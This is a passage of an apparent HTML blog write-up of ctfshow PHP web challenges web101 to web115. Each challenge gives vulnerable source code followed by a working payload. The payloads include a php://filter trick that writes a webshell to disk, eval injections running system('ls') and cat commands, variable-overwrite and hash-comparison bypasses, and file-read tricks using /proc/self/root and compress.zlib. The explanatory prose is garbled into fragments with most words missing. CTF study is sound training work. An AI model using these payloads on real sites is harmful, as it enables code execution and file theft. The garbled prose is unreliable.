v2&#x3D;00504438395948526859794171594473  v3&#x3D;php:&#x2F;&#x2F;1.php</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:v1=hex2bin</span><br><span class=\"line\"></span><br><span class=\"line\">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web103\"><a href=\"#web103\" class=\"headerlink\" title=\"web103\"></a>web103</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class=\"line\">        file_put_contents($v3,$str);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&#x27;Sorry&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure>\n\n<p>base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD89YGNhdCAqYDs</span><br></pre></td></tr></table></figure>\n\n<p>ascii</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959474e6864434171594473</span><br></pre></td></tr></table></figure>\n\n<p>e</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web104\"><a href=\"#web104\" class=\"headerlink\" title=\"web104\"></a>web104</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>sha(a[])null  null&#x3D;&#x3D;null</p>\n<h3 id=\"web105\"><a href=\"#web105\" class=\"headerlink\" title=\"web105\"></a>web105</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$error=&#x27;flag&#x27;;</span><br><span class=\"line\">$suces=&#x27;&#x27;;</span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;foreach($_POST as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;</span><br><span class=\"line\">die($suces); </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value; </span><br></pre></td></tr></table></figure>\n\n<p>GETKEYVALUE</p>\n<p> <code>$$key=$$value;</code> keyerror</p>\n<p> <code>suces=flag</code></p>\n<p> <code>$suces=$flag</code>flagsucesseceserror</p>\n<p>post <code>error=suces</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$errot=$suces=$flag</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error); </span><br></pre></td></tr></table></figure>\n\n<p>errorerrorflag</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?suces=flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST:error=suces</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web106\"><a href=\"#web106\" class=\"headerlink\" title=\"web106\"></a>web106</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">       parse_str($v1,$v2);</span><br><span class=\"line\">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class=\"line\">           echo $flag;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code></p>\n<blockquote>\n<p><strong>parse_str</strong> ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>\n<p> <code>encoded_string</code>  URL query string <code>result</code>  </p>\n</blockquote>\n<p>v3&#x3D;flag</p>\n<p><code>v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</code>flagmd5</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3=flag</span><br><span class=\"line\">POST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</span><br></pre></td></tr></table></figure>\n\n<p> md5nullv2flagnullnull&#x3D;&#x3D;null</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3[]=</span><br><span class=\"line\">POST:V1=</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web108\"><a href=\"#web108\" class=\"headerlink\" title=\"web108\"></a>web108</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class=\"line\">    die(&#x27;error&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//36dflag</span><br><span class=\"line\">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>ereg%00</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=a%00778</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class=\"line\">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>v1v2evalweb101<br>$v1v1$v2()</p>\n<p>__toString()phpReflectionclassExceptionError<br><code>__toString()</code></p>\n<blockquote>\n<p>PHP5.2.0__toString()  echo  print PHP5.2.0</p>\n</blockquote>\n<p>echo<code>$v1</code><code>__toString()</code>v2</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=CachingIterator&amp;v2=system(ls)</span><br><span class=\"line\">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>FilesystemIteratorFilesystemIteratorgetcwd()</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>\n\n<p>fl36dga.txt</p>\n<p>url&#x2F;fl36dga.txtflag</p>\n<p><code>FilesystemIterator</code></p>\n<p></p>\n<p></p>\n<blockquote>\n<p>FilesystemIteratorgetcwd()</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\techo getcwd().PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(getcwd());</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">D:\\PHP</span><br><span class=\"line\">  index.php</span><br><span class=\"line\">  index.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web111\"><a href=\"#web111\" class=\"headerlink\" title=\"web111\"></a>web111</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class=\"line\">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class=\"line\">            getFlag($v1,$v2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     </span><br></pre></td></tr></table></figure>\n\n<p>v1ctfshowgetFlag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br></pre></td></tr></table></figure>\n\n<p>$ctfshow&#x3D;$$v2,$$v1</p>\n<p><code>v2=GLOBALS</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web112\"><a href=\"#web112\" class=\"headerlink\" title=\"web112\"></a>web112</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&quot;hacker!&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>is_file</code></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p>is_filephp</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>filter</p>\n<p><strong>linux<code>/proc/self/root</code></strong></p>\n<p><code>ls /proc/self/root</code></p>\n<p><code>is_file</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>\n\n<p>flag.php</p>\n<h3 id=\"web114\"><a href=\"#web114\" class=\"headerlink\" title=\"web114\"></a>web114</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">echo &quot;tql &quot;;</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>compress</code><code>root</code>ban</p>\n<p></p>\n<p><code>filter</code>ban</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web115\"><a href=\"#web115\" class=\"headerlink\" title=\"web115\"></a>web115</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($num)&#123;</span><br><span class=\"line\">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class=\"line\">    return $num;</span><br><span class=\"line\">&#125;</span><br><span 